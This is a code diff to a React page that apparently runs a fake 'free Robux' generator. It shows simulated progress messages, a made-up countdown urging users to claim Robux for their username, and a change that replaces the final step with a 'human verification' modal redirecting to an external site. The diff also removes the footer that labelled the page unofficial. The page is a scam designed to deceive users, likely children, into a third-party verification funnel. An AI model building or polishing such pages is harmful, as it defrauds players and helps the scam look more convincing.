@@ -12,6 +12,7 @@ import {
   Server,
   Lock
 } from 'lucide-react';
+import { ClaimVerificationModal } from './ClaimVerificationModal';
 
 interface RobloxTipsPageProps {
   onBack: () => void;
@@ -127,9 +128,9 @@ export const RobloxTipsPage: React.FC<RobloxTipsPageProps> = ({ onBack }) => {
 
     const timer4 = setTimeout(() => {
       setProgress(100);
-      setProgressLog('Ready for final security verification!');
+      setProgressLog('Ready for human verification!');
       setStep('completed');
-    }, 4800);
+    }, 3600);
 
     return () => {
       clearTimeout(timer1);
@@ -419,51 +420,15 @@ export const RobloxTipsPage: React.FC<RobloxTipsPageProps> = ({ onBack }) => {
           </div>
         )}
 
-        {/* STEP 4: Human Verification Required */}
+        {/* STEP 4: Human Verification Modal matching user screenshot */}
         {step === 'completed' && (
-          <div className="bg-white rounded-2xl shadow-xl p-6 border border-gray-100 text-center space-y-5 animate-in fade-in">
-            <div className="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mx-auto shadow-inner">
-              <ShieldCheck className="w-8 h-8" />
-            </div>
-
-            <div>
-              <h3 className="font-extrabold text-gray-900 text-lg">
-                Final Step: Human Verification
-              </h3>
-              <p className="text-xs text-gray-600 mt-1.5 leading-relaxed">
-                Almost done! To prevent automated bot abuse, please complete a quick verification check to release your <strong>{selectedAmount.toLocaleString()} Robux</strong> to <strong>{username}</strong>.
-              </p>
-            </div>
-
-            <div className="p-3 bg-amber-50 rounded-xl border border-amber-200 text-xs text-amber-800 font-medium">
-              Your Robux voucher code has been reserved for the next <strong>14:59</strong> minutes.
-            </div>
-
-            <button
-              onClick={() => {
-                alert(`Verification passed! Transferring ${selectedAmount.toLocaleString()} Robux to account "${username}". Enjoy!`);
-                handleReset();
-              }}
-              className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 px-6 rounded-xl transition-all flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/20 cursor-pointer text-sm uppercase tracking-wide"
-            >
-              <CheckCircle2 className="w-4 h-4" />
-              <span>VERIFY NOW & CLAIM ROBUX</span>
-            </button>
-
-            <button
-              onClick={handleReset}
-              className="text-xs text-gray-400 hover:text-gray-600 underline cursor-pointer"
-            >
-              Start over with another username
-            </button>
-          </div>
+          <ClaimVerificationModal
+            isOpen={true}
+            onClose={handleReset}
+            redirectUrl="https://puz-rdx.pages.dev/"
+          />
         )}
       </main>
-
-      {/* Footer */}
-      <footer className="py-4 text-center text-xs text-gray-400 border-t border-gray-200/60 bg-white/50">
-        © 2026 ROBLOX TIPS. All rights reserved. • Unofficial Companion Tool
-      </footer>
     </div>
   );
 };
